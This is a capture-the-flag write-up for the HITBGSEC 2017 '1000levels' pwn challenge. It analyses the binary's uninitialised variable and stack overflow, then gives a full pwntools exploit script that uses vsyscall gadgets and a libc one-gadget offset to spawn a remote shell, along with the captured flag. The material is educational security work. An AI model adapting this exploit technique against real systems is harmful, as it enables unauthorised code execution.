---
title: "HITBGSEC CTF 2017 - 1000levels (Pwn)"
header:
  overlay_image: /assets/images/hitbgsec2017/1000levels/header.jpg
  overlay_filter: 0.5
  caption: "Photo credits: Rebecca Li on Unsplash"
tags:
  - hitbgsec2017
  - writeup
  - pwn
---

Uninitialised variable usage allows for reliable exploitation of a classic stack
overflow on a NX and PIE enabled binary using gadgets from the vsyscall page and
the magic libc address.

{% include toc icon="columns" title="1000levels (Pwn)" %}

## Challenge Description

#### Points

606

#### Description

```
It's more diffcult.

nc 47.74.147.103 20001
```

#### Files

- [498a3f10-8976-4733-8bdb-30d6f9d9fdad.gz]({{ site.url }}{{ site.baseurl }}/assets/files/hitbgsec2017/1000levels/498a3f10-8976-4733-8bdb-30d6f9d9fdad.gz)

## Introduction

The program is a simple math game with two options: play the game or ask for a
hint. When you ask for a hint, it tells you to pwn it. When you play the game it
prompts for two numbers, adds it and runs the game for that many levels.

```shell
amon@narwhals:~$ ./1000levels
Welcome to 1000levels, it's much more diffcult than before.
1. Go
2. Hint
3. Give up
Choice:
2
NO PWN NO FUN
1. Go
2. Hint
3. Give up
Choice:
1
How many levels?
1
Any more?
1
Let's go!'
====================================================
Level 1
Question: 0 * 0 = ? Answer:0
====================================================
Level 2
Question: 1 * 0 = ? Answer:0
Great job! You finished 2 levels in 3 seconds
```

Before we analyse it, let's check the security settings on the binary. The stack
canary is disabled but the binary is PIE and NX.

```shell
gdb-peda$ checksec
CANARY    : disabled
FORTIFY   : disabled
NX        : ENABLED
PIE       : ENABLED
RELRO     : Partial
gdb-peda$
```

## Important Functions

There are three important functions we have to understand before exploiting the
binary.

1. hint()
2. go()
3. level(int32\_t)

### hint()

This is a simple function.

![1]({{ site.url }}{{ site.baseurl }}/assets/images/hitbgsec2017/1000levels/1.png){: .align-center}

What happens is that the address of system is copied onto the stack at
`var_118`, then a check that the global variable `show_hint` is zero is
performed. If the value is zero, the string "NO PWN NO FUN" is printed to the
user. Otherwise, the hint with the address of system is printed to the user.

This is important because we need an information leak to bypass the ASLR which
is made more important because PIE is enabled and we have no gadgets to use.
However, it does not seem like we can trigger that path.

Here is the pseudocode of the function:

```c
int _Z4hintv() {
    var_110 = *0x201fd0;
    if (*(int32_t *)show_hint != 0x0) {
            sprintf(&var_110 + 0x8, "Hint: %p\n", var_110);
    }
    else {
            *(&var_110 + 0x8) = 0x4e204e5750204f4e;
            *(int32_t *)(&var_110 + 0x10) = 0x5546204f;
            *(int16_t *)(&var_110 + 0x14) = 0x4e;
    }
    rax = puts(&var_110 + 0x8);
    return rax;
}
```

### go()

This function begins by reading a number from the user and checking if it is
below or equal to zero. If it is, it prints "Coward" to the user. Otherwise, it
copies the number read into `var_118` which is on the stack. This is important
because it means that if we force it to print "Coward", `var_118` contains
whatever value it held before it entered the function. This is the uninitalised
variable vulnerability.

![2]({{ site.url }}{{ site.baseurl }}/assets/images/hitbgsec2017/1000levels/2.png){: .align-center}

Now, it reads another number from the user, adds that to the value stored at
`var_118`, and goes down three paths based on the calculated value.

1. If the value is less than or equals to zero, it calls the user "Coward", and
   returns from the function to display the main menu again.
2. If the value is more than 1000, it prints "More levels than before!" and sets
   an initial value (used later) to 1000.
3. Otherwise, the initial value is set to the value of `var_118`.

![3]({{ site.url }}{{ site.baseurl }}/assets/images/hitbgsec2017/1000levels/3.png){: .align-center}

Next the `level(int32_t)` function is called with the initial value.

![4]({{ site.url }}{{ site.baseurl }}/assets/images/hitbgsec2017/1000levels/4.png){: .align-center}

When that returns, the return code is checked to see if all the levels were
passed and the function returns.

Here is the rough pseudocode of the function:

```c
int _Z2gov() {
    puts("How many levels?");
    var_120 = read_num();
    if (var_120 <= 0x0) {
            puts("Coward");
    }
    else {
            var_110 = var_120;
    }
    puts("Any more?");
    var_120 = read_num();
    var_110 = var_120 + var_110;
    if (var_110 <= 0x0) {
            rax = puts("Coward");
    }
    else {
            if (var_110 > 0x3e7) {
                    puts("More levels than before!");
                    var_108 = 0x3e8;
            }
            else {
                    var_108 = var_110;
            }
            puts("Let's go!'");
            var_118 = time(0x0);
            if ((level(var_108) != 0x0 ? 0x1 : 0x0) != 0x0) {
                    sprintf(&var_120 + 0x20, "Great job! You finished %d levels in %d seconds\n", var_108, time(0x0) - var_118);
                    puts(&var_120 + 0x20);
            }
            else {
                    puts("You failed.");
            }
            rax = exit(0x0);
    }
    return rax;
}
```

### level(int32\_t)

This is a recursive function that implements the game loop. It can be simplified
in the following formula:

```shell

level(n):
    if n == 0: return 1
    else:
        if level(n - 1) == 0:
            return 0
        else:
            number1 = random()
            number2 = random()
            solution = number1 * number2
            answer = read_from_user()
            if solution == answer:
                return 1
    return 0
```

The main vulnerability lies in reading the answer from the user. It reads 400
bytes into a buffer that is too small to contain it. Since the canary is
disabled, it is sufficient to overwrite the saved instruction pointer on the
stack to get control over the control flow.

![5]({{ site.url }}{{ site.baseurl }}/assets/images/hitbgsec2017/1000levels/5.png){: .align-center}

The interesting thing about the function is that it prevents partial overwrites
to bypass the PIE defense by checking if the number of bytes read is aligned to
8 bytes. If it isn't aligned, it zeroes out the other bytes of double word.

![6]({{ site.url }}{{ site.baseurl }}/assets/images/hitbgsec2017/1000levels/6.png){: .align-center}

Here is the psuedocode of the function:

```c
int _Z5leveli(int arg0) {
    var_34 = arg0;
    if (var_34 == 0x0) {
            rax = 0x1;
    }
    else {
            if ((level(var_34 - 0x1) == 0x0 ? 0x1 : 0x0) != 0x0) {
                    rax = 0x0;
            }
            else {
                    var_30 = 0x0;
                    temp_1 = rand() % var_34;
                    temp_3 = rand() % var_34;
                    var_10 = temp_1 * temp_3;
                    puts(0x1160);
                    printf("Level %d\n", var_34);
                    printf("Question: %d * %d = ? Answer:", temp_1, temp_3);
                    var_4 = read(0x0, &var_30, 0x400);
                    while ((var_4 & 0x7) != 0x0) {
                            *(int8_t *)(rbp + sign_extend_32(var_4) + 0xffffffffffffffd0) = 0x0;
                            var_4 = var_4 + 0x1;
                    }
                    var_30 = 0x0;
                    if ((strtol(&var_30, 0x0, 0xa) == sign_extend_32(var_10) ? 0x1 : 0x0) != 0x0) {
                            rax = 0x1;
                    }
                    else {
                            rax = 0x0;
                    }
            }
    }
    return rax;
}
```

## Final Exploit

Here's the final exploit script:

```python
from pwn import *
import sys

#context.log_level = "debug"

system_offset = 0x0000000000045390
ret_address = 0xffffffffff600400
target_offset = 0x4526a

difference = target_offset - system_offset

def answer(eqn):
    parse = eqn[9:eqn.find("=")]
    soln = eval(parse)
    return soln

def main():
    #p = process("./1000levels")
    p = remote("47.74.147.103", 20001)

    p.sendline("2")
    p.clean()
    p.sendline("1")
    p.clean()
    p.sendline("0")
    p.clean()
    p.sendline(str(difference))

    for i in range(999):
        p.recvline_contains("Level")
        eqn = p.clean()

        soln = answer(eqn)
        p.send(str(soln)+"\x00")
        if i % 50 == 0:
            log.info("Please wait... %d/1000" % i)

    pay = str(soln) + "\x00"
    pay = pay.ljust(56, "B")
    pay += p64(ret_address)*3
    log.info("Injected our vsyscall ROPs")

    p.send(pay)
    p.clean()

    p.success("Shell spawned! Enjoy!")
    p.interactive()

if __name__ == "__main__":
    main()
```

Running the exploit:

[![asciicast](https://asciinema.org/a/hkB2nBw48CADpbHaeuvkZF9zO.png)](https://asciinema.org/a/hkB2nBw48CADpbHaeuvkZF9zO)

Flag: **HITB{d989d44665a5a58565e09e7442606506}**
